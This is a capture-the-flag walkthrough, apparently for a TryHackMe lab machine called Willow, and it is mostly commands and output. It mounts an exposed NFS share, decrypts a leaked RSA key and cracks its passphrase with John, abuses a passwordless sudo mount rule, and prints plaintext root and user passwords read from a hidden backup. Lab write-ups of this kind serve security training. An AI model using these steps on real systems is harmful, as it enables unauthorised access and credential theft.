# Willow

## nmap scan
INITIAL
```
PORT     STATE SERVICE VERSION                                                                                                                                                                
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))                                          
| http-methods:                                                                                
|_  Supported Methods: GET HEAD POST OPTIONS                                                   
|_http-server-header: Apache/2.4.10 (Debian)                                                   
|_http-title: Recovery Page                                                                    
111/tcp  open  rpcbind 2-4 (RPC #100000)                                                       
2049/tcp open  nfs_acl 2-3 (RPC #100227)
```

## gobuster
COMMON
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
```

## webpage data decryption
> REDACTED

## probable username : -------------

1. user.txt

	1. search for possible nfs mounts `showmount -e IP`
```
Export list for 10.10.208.225:                                                                  
/var/failsafe *
```
	2. mkdir tmp && mkdir /tmp/nfs
		1. sudo mount -t nfs IP:/var/failsafe ./tmp/nfs
	
  3. ls -la ./tmp/nfs
```
total 8
drwxr--r-- 2 nobody nogroup 4096 Jan 30  2020 .
drwxr-xr-x 1 user   user       6 Feb 25 19:29 ..
-rw-r--r-- 1 root   root      62 Jan 30  2020 rsa_keys
```

	4. cat ./tmp/nfs/rsa_keys
```
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

	5. use this site https://www.cs.drexel.edu/~jpopyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html
		1. with decryption key : `61527`
		2. and with modulus : `37627`
	
  6. use ssh to john `python2 /usr/share/john/ssh2john.py rsakey > rsaHASH`
	
  7. use john `john rsakey -w=/usr/share/wordlists/rockyou.txt`
```
passphrase: wildflower
```
	
  8. ssh into the server using passphrase wildflower `ssh -i rsakey wildflower@IP`
	
	9. scp -i rsakey willow@IP:/user.jpg .

	10. open user.jpg flag is there fuck sake i spent half an hour using steghide and such on it this is a direct callout MuirlandOracle


```
THM{REDACTED}
```

2. root.txt

	1. sudo -l shows us the following
```
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*

```

	2. ls -la on /dev/ 
	
  3. we find an interesting directory called `hidden_backups`
	 
  4. looking for a place to mount this directory we check /mnt
  
	5. in /mnt we find an empty directory called creds lets mount hidden_backup in there

	6. sudo /bin/mount /dev/hidden_backup /mnt/creds/ ( used to mount hidden_backups into the creds directory )
	
  5. cat /mnt/creds/creds.txt
```
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
```

	6. su root with root passwd
	
  7. change to root directory and cat root.txt
```
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag!
```
	
  8. go back to the user.jpg and use steghide on it 
  
    1. `steghide --extract -sf user.jpg -xf userOUTPUT` 
    2. use the password for root as the passphrase and you get the flag
	
  9. cat userOUTPUT

```
THM{REDACTED}
```
